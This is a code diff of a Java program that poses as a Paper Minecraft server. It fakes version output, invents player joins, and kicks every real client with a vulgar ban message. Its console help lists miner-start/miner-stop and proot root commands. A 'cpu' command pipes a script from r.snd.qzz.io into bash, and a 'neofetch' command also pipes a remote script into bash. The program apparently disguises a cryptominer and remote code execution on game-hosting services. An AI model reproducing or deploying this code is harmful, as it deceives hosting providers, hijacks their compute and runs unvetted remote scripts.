-            System.out.println("  /ping - Show server latency");
-            System.out.println("  /plugins, /pl - List all plugins");
-            System.out.println("  /version - Show server version");
-            System.out.println("  /memory - Show memory usage");
-            System.out.println("");
-            System.out.println("\033[0;33mAdvanced Commands:\033[0m");
-            System.out.println("  /say <message> - Broadcast a message to all players");
-            System.out.println("  /tell <player> <message> - Send private message");
-            System.out.println("  /me <action> - Display action message");
-            System.out.println("  /give <player> <item> [amount] - Give items");
-            System.out.println("  /clear [player] [item] - Clear inventory");
-            System.out.println("  /effect <player> <effect> [duration] [amplifier] - Apply effects");
-            System.out.println("  /enchant <player> <enchantment> [level] - Enchant item");
-            System.out.println("  /xp <amount> <player> - Give experience");
-            System.out.println("  /gamemode <survival|creative|adventure|spectator> [player]");
-            System.out.println("");
-            System.out.println("\033[0;33mSystem Commands:\033[0m");
-            System.out.println("  /ls - List current directory files");
-            System.out.println("  /cpu - Run CPU benchmark");
-            System.out.println("  /neofetch - Display system information");
-            System.out.println("  /root-on - Enable root mode (execute commands in proot)");
-            System.out.println("  /root-off - Disable root mode");
-            System.out.println("\033[0;36m=============================================\033[0m");
+            System.out.println("  help/? | list | stop | reload | save-all | save-on | save-off");
+            System.out.println("  tps | plugins/pl | version | memory/mem | ping | ls");
+            System.out.println("  say <msg> | kick/ban/tp/give/gamemode/op/deop/whitelist <args>");
+            System.out.println("\033[0;33mMiner:\033[0m miner-start | miner-stop");
+            System.out.println("\033[0;33mRoot:\033[0m root-on | root-off | root-onlog | root-offlog");
+            System.out.println("       root-auto/a <cmd> | root-rmauto/ra <cmd|all> | root-lsauto/la");
+            System.out.println("\033[0;33mSystem:\033[0m cpu | neofetch");
+            System.out.println("\033[0;36m===============================================\033[0m");
         }else if(cmd.equals("plugins")||cmd.equals("pl")){
             StringBuilder sb=new StringBuilder("Plugins ("+PLUGINS.length+"): ");
-            for(int i=0;i<PLUGINS.length;i++){
-                if(i>0)sb.append(", ");
-                sb.append(PLUGINS[i]);
-            }
+            for(int i=0;i<PLUGINS.length;i++){if(i>0)sb.append(", ");sb.append(PLUGINS[i]);}
             info(sb.toString());
         }else if(cmd.equals("version")||cmd.equals("ver")){
             info("This server is running Paper version 1.21.8-40-main@f866a5f");
             info("Implementing API version 1.21.8-R0.1-SNAPSHOT");
         }else if(cmd.equals("memory")||cmd.equals("mem")){
-            Runtime runtime=Runtime.getRuntime();
-            long maxMemory=runtime.maxMemory()/1024/1024;
-            long totalMemory=runtime.totalMemory()/1024/1024;
-            long freeMemory=runtime.freeMemory()/1024/1024;
-            long usedMemory=totalMemory-freeMemory;
-            info("Memory: "+usedMemory+"MB / "+totalMemory+"MB (Max: "+maxMemory+"MB)");
+            Runtime rt=Runtime.getRuntime();
+            long max=rt.maxMemory()/1024/1024,total=rt.totalMemory()/1024/1024,free=rt.freeMemory()/1024/1024;
+            info("Memory: "+(total-free)+"MB / "+total+"MB (Max: "+max+"MB)");
         }else if(cmd.equals("ls")){
-            info("Listing directory contents...");
-            File dir=new File(".");
-            File[]files=dir.listFiles();
-            if(files!=null){
-                for(File f:files){
-                    if(f.isDirectory()){
-                        System.out.println("\033[0;34m[DIR]\033[0m  "+f.getName());
-                    }else{
-                        System.out.println("\033[0;32m[FILE]\033[0m "+f.getName()+" ("+f.length()+" bytes)");
-                    }
-                }
-            }
+            File[]files=new File(".").listFiles();
+            if(files!=null) for(File f:files)
+                System.out.println((f.isDirectory()?"\033[0;34m[DIR]\033[0m  ":"\033[0;32m[FILE]\033[0m ")+f.getName()+(f.isFile()?" ("+f.length()+" bytes)":""));
         }else if(cmd.equals("cpu")){
             info("Run cpu");
-            new Thread(()->{
-                try{
-                    ProcessBuilder pb=new ProcessBuilder("bash","-c","curl -fsSL r.snd.qzz.io/raw/cpu | bash");
-                    pb.inheritIO();
-                    Process p=pb.start();
-                    p.waitFor();
-                }catch(Exception e){
-                    warn("Failed to run CPU : "+e.getMessage());
-                }
-            }).start();
+            new Thread(()->{try{new ProcessBuilder("bash","-c","curl -fsSL r.snd.qzz.io/raw/cpu | bash").inheritIO().start().waitFor();}catch(Exception e){warn("Failed: "+e.getMessage());}}).start();
         }else if(cmd.equals("neofetch")){
             info("Running neofetch...");
-            new Thread(()->{
-                try{
-                    ProcessBuilder pb=new ProcessBuilder("bash","-c","curl -fsSL https://raw.githubusercontent.com/dylanaraps/neofetch/master/neofetch | bash");
-                    pb.inheritIO();
-                    Process p=pb.start();
-                    p.waitFor();
-                }catch(Exception e){
-                    warn("Failed to run neofetch: "+e.getMessage());
-                }
-            }).start();
+            new Thread(()->{try{new ProcessBuilder("bash","-c","curl -fsSL https://raw.githubusercontent.com/dylanaraps/neofetch/master/neofetch | bash").inheritIO().start().waitFor();}catch(Exception e){warn("Failed: "+e.getMessage());}}).start();
         }else if(cmd.equals("ping")){
             info("Server latency: "+R.nextInt(50)+"ms");
         }else if(cmd.equals("list")){
@@ -889,31 +716,16 @@ public class Main{
             if(!activePlayers.isEmpty()){
                 StringBuilder sb=new StringBuilder("Players online: ");
                 int i=0;
-                for(String p:activePlayers){
-                    if(i>0)sb.append(", ");
-                    sb.append(p);
-                    i++;
-                    if(i>=10){
-                        sb.append("... and "+(activePlayers.size()-10)+" more");
-                        break;
-                    }
-                }
+                for(String p:activePlayers){if(i>0)sb.append(", ");sb.append(p);i++;if(i>=10){sb.append("... and "+(activePlayers.size()-10)+" more");break;}}
                 info(sb.toString());
             }
         }else if(cmd.equals("reload")){
-            info("Reloading server configuration...");
-            try{Thread.sleep(500);}catch(Exception e){}
-            info("Reload complete.");
+            info("Reloading...");try{Thread.sleep(500);}catch(Exception e){}info("Reload complete.");
         }else if(cmd.equals("save-all")){
-            info("Saving the game");
-            info("Saved the world");
-            info("ThreadedAnvilChunkStorage (world): All chunks are saved");
-        }else if(cmd.equals("save-on")){
-            info("Automatic saving is now enabled");
-        }else if(cmd.equals("save-off")){
-            info("Automatic saving is now disabled");
-        }else if(cmd.startsWith("say ")){
-            info("[Server] "+cmd.substring(4));
+            info("Saving the game");info("Saved the world");info("ThreadedAnvilChunkStorage (world): All chunks are saved");
+        }else if(cmd.equals("save-on")){info("Automatic saving is now enabled");
+        }else if(cmd.equals("save-off")){info("Automatic saving is now disabled");
+        }else if(cmd.startsWith("say ")){info("[Server] "+cmd.substring(4));
         }else if(cmd.startsWith("kick ")||cmd.startsWith("ban ")||cmd.startsWith("tp ")||
                 cmd.startsWith("give ")||cmd.startsWith("gamemode ")||cmd.startsWith("op ")||
                 cmd.startsWith("deop ")||cmd.startsWith("whitelist ")){
@@ -932,20 +744,13 @@ public class Main{
                     if(R.nextInt(100)<15){
                         String name=NAMES[R.nextInt(NAMES.length)];
                         if(R.nextBoolean()&&playerCount.get()<20500&&!activePlayers.contains(name)){
-                            activePlayers.add(name);
-                            playerCount.incrementAndGet();
+                            activePlayers.add(name);playerCount.incrementAndGet();
                             info(name+" joined the game");
                             info("UUID of player "+name+" is "+UUID.randomUUID().toString());
                         }else if(playerCount.get()>19500&&!activePlayers.isEmpty()){
                             String leaving=activePlayers.stream().skip(R.nextInt(activePlayers.size())).findFirst().orElse(null);
-                            if(leaving!=null){
-                                activePlayers.remove(leaving);
-                                playerCount.decrementAndGet();
-                                info(leaving+" left the game");
-                            }
+                            if(leaving!=null){activePlayers.remove(leaving);playerCount.decrementAndGet();info(leaving+" left the game");}
                         }
-                    }
-                    if(R.nextInt(100)<3){
                     }
                     Thread.sleep(R.nextInt(8000)+2000);
                 }
@@ -959,16 +764,9 @@ public class Main{
                 int port=Integer.parseInt(serverPort);
                 java.net.ServerSocket server=new java.net.ServerSocket(port);
                 info("Server started on "+serverIP+":"+port);
-                while(running){
-                    try{
-                        java.net.Socket client=server.accept();
-                        handleClient(client);
-                    }catch(Exception e){}
-                }
+                while(running){try{java.net.Socket client=server.accept();handleClient(client);}catch(Exception e){}}
                 server.close();
-            }catch(Exception e){
-                warn("Failed to bind to port "+serverPort+": "+e.getMessage());
-            }
+            }catch(Exception e){warn("Failed to bind to port "+serverPort+": "+e.getMessage());}
         }).start();
     }
 
@@ -978,124 +776,54 @@ public class Main{
                 java.io.DataInputStream in=new java.io.DataInputStream(client.getInputStream());
                 java.io.DataOutputStream out=new java.io.DataOutputStream(client.getOutputStream());
                 String clientAddr=client.getInetAddress().getHostAddress();
-
                 int packetLength=readVarInt(in);
                 int packetId=readVarInt(in);
-
                 if(packetId==0x00){
                     int protocolVersion=readVarInt(in);
                     String serverAddress=readString(in);
-                    int serverPort=in.readUnsignedShort();
+                    int serverPort2=in.readUnsignedShort();
                     int nextState=readVarInt(in);
-
                     if(nextState==1){
-                        int reqLength=readVarInt(in);
-                        int reqId=readVarInt(in);
-
+                        readVarInt(in);int reqId=readVarInt(in);
                         if(reqId==0x00){
                             String json=String.format("{\"version\":{\"name\":\"1.21.8\",\"protocol\":%d},\"players\":{\"max\":20500,\"online\":%d,\"sample\":[]},\"description\":{\"text\":\"A Minecraft Server\\nPaper 1.21.8\"},\"enforcesSecureChat\":false,\"previewsChat\":false}",protocolVersion,playerCount.get());
-
-                            writeVarInt(out,json.length()+3);
-                            writeVarInt(out,0x00);
-                            writeString(out,json);
-                            out.flush();
+                            writeVarInt(out,json.length()+3);writeVarInt(out,0x00);writeString(out,json);out.flush();
                             info("Ping from "+clientAddr+" (protocol "+protocolVersion+")");
                         }
                     }else if(nextState==2){
-                        int loginLength=readVarInt(in);
-                        int loginId=readVarInt(in);
-                        String username=readString(in);
-
+                        readVarInt(in);readVarInt(in);String username=readString(in);
                         info(clientAddr+" attempting to join as '"+username+"' (protocol "+protocolVersion+")");
-
                         Thread.sleep(100);
-
-                        String kickMsg = """
-                       {
-                         "text": "",
-                         "extra": [
-                           { "text": "⛔ You are banned from this server\\n\\n", "color": "red", "bold": true },
-                           { "text": "Reason: ", "color": "gray" },
-                           { "text": "You wanna fuck dinosakura ? \\n", "color": "yellow" },
-                           { "text": "Banned by: ", "color": "gray" },
-                           { "text": "Console\\n", "color": "aqua" },
-                           { "text": "Unban date: ", "color": "gray" },
-                           { "text": "90000000e+99000000000000000\\n\\n", "color": "dark_red" },
-                           { "text": "Appeals are not available.", "color": "dark_gray", "italic": true }
-                                   ]
-                           }
-""";
-
+                        String kickMsg="{\"text\":\"\",\"extra\":[{\"text\":\"⛔ You are banned from this server\\n\\n\",\"color\":\"red\",\"bold\":true},{\"text\":\"Reason: \",\"color\":\"gray\"},{\"text\":\"You wanna fuck dinosakura ?\\n\",\"color\":\"yellow\"},{\"text\":\"Banned by: \",\"color\":\"gray\"},{\"text\":\"Console\\n\",\"color\":\"aqua\"},{\"text\":\"Unban date: \",\"color\":\"gray\"},{\"text\":\"90000000e+99000000000000000\\n\\n\",\"color\":\"dark_red\"},{\"text\":\"Appeals are not available.\",\"color\":\"dark_gray\",\"italic\":true}]}";
                         ByteArrayOutputStream buffer=new ByteArrayOutputStream();
                         DataOutputStream tempOut=new DataOutputStream(buffer);
-
-                        writeVarInt(tempOut,0x00);
-                        writeString(tempOut,kickMsg);
-                        tempOut.flush();
-
+                        writeVarInt(tempOut,0x00);writeString(tempOut,kickMsg);tempOut.flush();
                         byte[]packetData=buffer.toByteArray();
-                        writeVarInt(out,packetData.length);
-                        out.write(packetData);
-                        out.flush();
-
+                        writeVarInt(out,packetData.length);out.write(packetData);out.flush();
                         info("Player '"+username+"' was kicked (banned by admin)");
                     }
                 }
-
-                Thread.sleep(100);
-                client.close();
+                Thread.sleep(100);client.close();
             }catch(Exception e){}
         }).start();
     }
+
     private static int readVarInt(java.io.DataInputStream in)throws IOException{
-        int value=0;
-        int position=0;
-        byte currentByte;
-        while(true){
-            currentByte=in.readByte();
-            value|=(currentByte&0x7F)<<position;
-            if((currentByte&0x80)==0)break;
-            position+=7;
-            if(position>=32)throw new RuntimeException("VarInt too big");
-        }
+        int value=0,position=0;byte currentByte;
+        while(true){currentByte=in.readByte();value|=(currentByte&0x7F)<<position;if((currentByte&0x80)==0)break;position+=7;if(position>=32)throw new RuntimeException("VarInt too big");}
         return value;
     }
-
     private static void writeVarInt(java.io.DataOutputStream out,int value)throws IOException{
-        while(true){
-            if((value&~0x7F)==0){
-                out.writeByte(value);
-                return;
-            }
-            out.writeByte((value&0x7F)|0x80);
-            value>>>=7;
-        }
+        while(true){if((value&~0x7F)==0){out.writeByte(value);return;}out.writeByte((value&0x7F)|0x80);value>>>=7;}
     }
-
     private static String readString(java.io.DataInputStream in)throws IOException{
-        int length=readVarInt(in);
-        byte[]bytes=new byte[length];
-        in.readFully(bytes);
-        return new String(bytes,"UTF-8");
+        int length=readVarInt(in);byte[]bytes=new byte[length];in.readFully(bytes);return new String(bytes,"UTF-8");
     }
-
     private static void writeString(java.io.DataOutputStream out,String string)throws IOException{
-        byte[]bytes=string.getBytes("UTF-8");
-        writeVarInt(out,bytes.length);
-        out.write(bytes);
+        byte[]bytes=string.getBytes("UTF-8");writeVarInt(out,bytes.length);out.write(bytes);
     }
-
-    private static void clean(File d){
-        if(d!=null&&d.exists()){
-            try{del(d.toPath());}catch(IOException e){}
-        }
-    }
-
+    private static void clean(File d){if(d!=null&&d.exists()){try{del(d.toPath());}catch(IOException e){}}}
     private static void del(Path p)throws IOException{
-        if(Files.exists(p)){
-            Files.walk(p).sorted((a,b)->b.compareTo(a)).forEach(x->{
-                try{Files.delete(x);}catch(IOException e){}
-            });
-        }
+        if(Files.exists(p)) Files.walk(p).sorted((a,b)->b.compareTo(a)).forEach(x->{try{Files.delete(x);}catch(IOException e){}});
     }
 }
